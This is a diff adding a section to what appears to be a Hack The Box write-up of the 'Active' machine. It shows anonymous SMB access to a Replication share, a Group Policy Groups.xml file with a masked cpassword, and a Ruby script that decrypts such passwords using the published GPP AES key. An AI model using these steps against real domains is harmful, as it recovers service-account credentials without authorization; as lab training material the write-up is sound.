@@ -179,3 +179,47 @@ SMB         10.129.190.90   445    DC               SYSVOL                      
 SMB         10.129.190.90   445    DC               Users                           
 ```
 >  As we can see above, without adding `-d active.htb` in the command we can get the domain name this could be useful if you cant get it from LDAP for some reason
+
+# SMB ACCESS
+
+> We have read access to the Replication share on active.htb lets connect to it and see if we can find anything of use
+
+```bash
+smbclient \\\\active.htb\\Replication -I 10.129.190.90 -N
+```
+> Enumerating the share we find Groups.xml in the path `\\active.htb\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\`
+> we can decrypt the "cpassword" variable and get a password
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="xxxxxxxxxxxxxxxxxxxxxxxx" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+```
+> With a quick google search of `group policy password decrypt` we will find a tool called [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/)
+> due to the way my machine is configured I will instead use a ruby script that does the samething
+
+```ruby
+require 'rubygems'
+require 'openssl'
+require 'base64'
+
+encrypted_data = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+def decrypt(encrypted_data)
+  padding = "=" * (4 - (encrypted_data.length % 4))
+  epassword = "#{encrypted_data}#{padding}"
+  decoded = Base64.decode64(epassword)
+
+  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
+  aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
+  aes.decrypt
+  aes.key = key
+  plaintext = aes.update(decoded)
+  plaintext << aes.final
+  pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
+
+  return pass
+end
+
+blah = decrypt(encrypted_data)
+puts blah
+```
